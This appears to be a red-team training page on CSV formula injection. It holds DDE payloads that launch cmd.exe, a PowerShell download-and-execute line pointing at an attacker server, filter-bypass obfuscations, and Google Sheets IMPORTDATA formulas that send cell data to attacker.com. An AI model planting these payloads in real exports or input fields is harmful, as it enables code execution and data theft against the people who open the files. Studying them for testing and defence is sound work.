---
layout: training-page
title: "CSV Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - csv-injection
  - formula-injection
  - dde
  - web
page_key: "web-csv-injection"
render_with_liquid: false
---

# CSV Injection

CSV Injection, also known as Formula Injection, occurs when a web application allows user-controlled data to be exported into a CSV file that a victim then opens in a spreadsheet application (Excel, LibreOffice, Google Sheets). Spreadsheet software interprets cells beginning with certain characters as formulas and executes them, potentially leading to remote code execution on the victim's machine or data exfiltration.

## How It Works

Spreadsheet applications treat cells as formulas when they begin with any of these characters:

```
=
+
-
@
```

An attacker injects one of these prefixes into a field that gets stored and later exported in a CSV. When the victim opens the file, the formula executes.

## Dynamic Data Exchange (DDE) Attacks

DDE is a legacy Windows inter-process communication protocol that Excel supports. When a DDE formula is processed, Excel launches an external process such as `cmd.exe`.

### Spawn a Calculator (Proof of Concept)

```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'
```

### PowerShell Download and Execute

```
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### Obfuscation and Command Chaining

These variants help bypass filters that look for the raw `cmd` string:

```
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A
```

### Using rundll32 Instead of cmd

```
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
```

### Null Character Bypass

Null characters are ignored by the formula interpreter but break string-based WAF filters:

```
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

## DDE Payload Anatomy

Breaking down `=cmd|'/C calc'!A0`:

- `cmd` — the DDE server name (the process to launch)
- `/C calc` — the DDE topic, passed as the command argument
- `!A0` — the DDE item; specifies the data unit the server should return

## Google Sheets Data Exfiltration

Google Sheets supports URL-fetching formulas. These can be used for blind formula injection detection or out-of-band data exfiltration. The victim receives a warning prompt before the request fires, but many users click through.

```
=IMPORTXML("http://burp.collaborator.net/csv","//a/@href")
=IMPORTDATA("http://attacker.com/log?data="&A1)
=IMPORTFEED("http://attacker.com/collect")
=IMPORTHTML("http://attacker.com/collect","table",1)
```

Available Google Sheets import functions:

- `IMPORTXML(url, xpath_query)` — Fetches and parses XML/HTML from URL
- `IMPORTRANGE(spreadsheet_url, range)` — Imports data from another spreadsheet
- `IMPORTHTML(url, query, index)` — Imports a table or list from an HTML page
- `IMPORTFEED(url)` — Imports an RSS or Atom feed
- `IMPORTDATA(url)` — Imports data from a CSV or TSV at a URL

## Testing Methodology

Identify fields in the application that end up in CSV exports: usernames, first/last names, email addresses, addresses, comments, or any user-controlled string field. Inject a formula payload and trigger a CSV export, then open the file to observe behavior.

```
# Simple detection payload — if executed, will make outbound DNS/HTTP
=IMPORTXML(CONCAT("http://burp-collaborator.net/",SUBSTITUTE(A1," ","_")),"//a")

# Detect in Excel via DDE — shows a calc popup on open
=cmd|' /C calc'!'A1'
```

## Resources

- CSV Excel Macro Injection — OWASP — `owasp.org/www-community/attacks/CSV_Injection`
- CSV Formula Injection — Google Bug Hunter University — `bughunters.google.com/learn/invalid-reports/google-products/4965108570390528`
- From CSV to Meterpreter — Adam Chester — `blog.xpnsec.com/from-csv-to-meterpreter/`
- The Absurdly Underestimated Dangers of CSV Injection — George Mauer — `georgemauer.net/2017/10/07/csv-injection.html`
- Three New DDE Obfuscation Methods — ReversingLabs — `blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation`
